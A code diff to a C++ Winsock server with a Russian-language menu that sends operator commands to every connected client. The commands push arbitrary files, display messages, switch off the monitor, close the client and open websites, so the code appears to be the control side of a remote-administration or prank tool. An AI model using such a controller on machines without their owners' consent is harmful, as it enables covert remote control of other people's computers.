@@ -1,4 +1,4 @@
-//Server v 2.0
+//Server
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
 #pragma comment(lib,"Ws2_32.lib")
 #include <WinSock2.h>
@@ -7,7 +7,7 @@
 #include <string>
 #include <thread>
 #define PRINTNUSERS if (ClientCount) printf("%d user on-line\n", ClientCount); \
-        else printf("No User on line\n");
+        else printf("No User on-line\n");
 
 SOCKET Connect;
 SOCKET* Connections;
@@ -29,6 +29,7 @@ void concheck(SOCKET Connect1, SOCKET Listen1, HOSTENT *hst, sockaddr_in client_
 }
 
 int main() {
+
 	setlocale(LC_ALL, "russian");
 
 	WSAData data;
@@ -59,7 +60,7 @@ int main() {
 
 	freeaddrinfo(result);
 
-	printf("Start server...");
+	printf("Starting server...");
 	sockaddr_in client_addr;
 
 	int client_addr_size = sizeof(client_addr);
@@ -67,20 +68,13 @@ int main() {
 	hst = gethostbyaddr((char *)&client_addr.sin_addr.s_addr, 4, AF_INET);
 	for (;; Sleep(75))
 	{
-		char m_connect[256] = "";
+		char m_connect[256] = "--i";
 		if (Connect = accept(Listen, NULL, NULL)) {
 
 			printf("Client connected\n");
 			printf("+%s [%s] new connect!\n",
 				(hst) ? hst->h_name : "", inet_ntoa(client_addr.sin_addr));
 			PRINTNUSERS
-				int i = 0;
-				char a = getchar();
-				while (a != '\n') {
-					m_connect[i] = a;
-					i++;
-					a = getchar();
-				}
 			Connections[ClientCount] = Connect;
 			send(Connections[ClientCount], m_connect, strlen(m_connect), NULL);
 			std::thread t(concheck, Connect, Listen, hst, client_addr);
@@ -89,6 +83,7 @@ int main() {
 		while (true) {
 			char m_connect[256] = "";
 			int i = 0;
+			std::cout << "Введите команду:\n--s передать файл\n--m вывести сообщение\n--o выключить монитор\n--e закрыть клиент\n--w открыть сайт\n";
 			char a = getchar();
 			while (a != '\n') {
 				m_connect[i] = a;
@@ -98,10 +93,13 @@ int main() {
 			for (int i = 0; i <= ClientCount; i++) {
 				send(Connections[i], m_connect, strlen(m_connect), NULL);
 			}
-			if (m_connect[2] == 's') {
-				std::cout << "Начинаю передавать файл\n";
+			if ((m_connect[2] == 's')&&(m_connect[0]=='-')&&((m_connect[1] == '-'))) {
 				FILE *in;
-				fopen_s(&in,"C:\\Users\\Explo\\\Desktop\\Client.exe", "rb");
+				std::string file;
+				std::cout << "Введите путь к файлу\n";
+				std::cin >> file;
+				std::cout << "Начинаю передавать файл\n";
+				fopen_s(&in, file.c_str(), "rb");
 				while (!feof(in)) {
 					char bufer[1024] = "";
 					int b = fread(bufer, 1, sizeof(bufer), in);
@@ -109,7 +107,8 @@ int main() {
 					printf("bytes read: %d, part:%d, pos: %ld \n", b, size);
 					if (b != 0) send(Connections[ClientCount], bufer, b, 0);
 				}
-				std::cout << "файл отправлен!\n";
+				send(Connections[ClientCount], "@@^", 3, 0);
+				std::cout << "Файл отправлен!\n";
 			}
 		}
 	}
